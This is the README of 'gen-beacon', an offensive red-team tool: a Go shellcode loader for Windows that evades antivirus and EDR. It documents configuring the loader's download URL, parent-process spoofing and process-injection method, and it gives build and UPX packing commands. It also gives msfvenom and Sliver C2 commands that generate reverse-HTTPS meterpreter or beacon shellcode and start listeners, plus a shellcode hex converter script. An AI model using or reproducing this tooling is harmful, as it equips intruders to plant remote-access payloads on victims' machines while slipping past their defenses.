# Redteam Tool

💣 gen-beacon 💣

Windows Shellcode Loader written in Golang to bypass AV/EDR

## DESCRIPTION

Downloads shellcode hosted on Github or any Hosting Platform.

## INSTALLATION

### SETUP INSTRUCTIONS
```
go get github.com/D00MFist/Go4aRun/pkg/sliversyscalls/syscalls
go get golang.org/x/sys/windows
```

### QUICK USE
```
Bash:  export GOPATH="$HOME/go"; export GOOS="windows"
PSH:   $Env:GOOS = "windows"; $Env:GOARCH = "amd64"
Build: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o loader.exe cmd/implant/main.go
```

### EDIT & BUILD
```
1. Change const url
2. Change block dll behavior: between "not allowing non-MS" and "only store" through nonms and onlystore vars
3. Change parentName var to change spoofed parent
4. Change programPath var to change process launched by parent which shellcode will inject into
5. Change creationFlags to change behavior of programPath var launching
6. Select a Proc Injection Method by comment/uncommenting the sections CreateRemoteThread or QueueUserAPC

go build -a -gcflags=all="-l -B" -ldflags="-s -w -H=windowsgui" -o loader.exe cmd/implant/main.go // EXE
go build -buildmode=c-shared -o loader.dll cmd/implant/main.go // DLL
```

### UPX PACKING

```
upx --best --ultra-brute loader.exe
```

### HEX SHELLCODE FOR METASPLOIT

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<HOST> LPORT=<PORT> -b '\x00' -f hex -o shellcode.txt
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST k.a.l.i
set LPORT 8443
run -j
```

### HEX SHELLCODE FOR SLIVER C2
```
generate --os windows --format shellcode --http <HOST>:<PORT> --skip-symbols --arch x86
generate --os windows --format shellcode --http <HOST>:<PORT> --skip-symbols --arch x64
http -l <PORT>
```

### HELPER

Convert Payload.bin to HEX by using Mgeeky's converter
```
python2 bin2shellcode-mgeeky.py payload.bin > a
```

```
#!/usr/bin/python
# Disasm of 64-bit binary:
#   $ objdump -b binary -D -m i386:x86-64 <file>
#
# Usage:
#   $ ./bin2shellcode.py <file> num
# Where:
#   num - number of bytes to convert into array.
#         `num` can be negative, resulting in `size-num`
#         bytes be converted.
import binascii
import sys
import re

if __name__ == '__main__':
  if len(sys.argv) < 2 or len(sys.argv) > 3:
    print "Usage: %s <file> [len]" % sys.argv[0] 
  else:
    f = open(sys.argv[1], 'rb')
    bytes = f.read()
    num = len(bytes)
    if len(sys.argv) > 2:
        # if [len] is negative - substract it from
        # total length.
        num0 = int(sys.argv[2])
        if num0 < 0 and -num0 <= num:
            num += num0 -1
        elif -num0 > num:
            print '[!] To large negative value. Fallback to 0.'
        else:
            num = num0

    array = 'char shellcode[%d] = \n\t"' % (num)
    for b in range(len(bytes)):
      if b > num: break 
      if b % 16 == 0 and b > 0:
        array += '"\n\t"'
      array += '\\x%02x' % ord(bytes[b])

    array += '";\n'

#    print array

    hexcode = binascii.b2a_hex(open(sys.argv[1], "rb").read()).decode()
    print("".join(re.findall("..", hexcode)))
```

#### Thanks

* https://github.com/D00MFist/Go4aRun

Related Blog Posts:

* https://posts.specterops.io/going-4-a-run-eb263838b944
* https://posts.specterops.io/going-4-a-hunt-66c9f0d7f32c
* https://github.com/matterpreter/DefenderCheck

References/ Resources:

* www.thepolyglotdeveloper.com/2018/02/encrypt-decrypt-data-golang-application-crypto-packages/
* https://medium.com/syscall59/a-trinity-of-shellcode-aes-go-f6cec854f992
* https://ired.team/offensive-security/defense-evasion/preventing-3rd-party-dlls-from-injecting-into-your-processes
* https://gist.github.com/rvrsh3ll/1e66f0f2c7103ff8709e5fd63ca346ac
* https://github.com/BishopFox/sliver
* https://github.com/bluesentinelsec/OffensiveGoLang
* https://github.com/djhohnstein/CSharpCreateThreadExample
* https://github.com/Ne0nd0g/merlin

## Contribute

Submit issues, add feature requests or pull requests.

## ToDo

* Payload AES Encryption
* Set lifetime span for payload
* Persistence - scripting with sliver nodejs for connectors
* Registry Startup
* Registry COM CLSID Object
* User Start Folder
* Enumeration
* Applocker bypass checks
* AV detection
* Post-Exploitation
* Network discovery
* Lateral Movement
* Scheduled Task
* Exfiltration

## License

This project is licensed under WTFWPL - see the License file for more details.
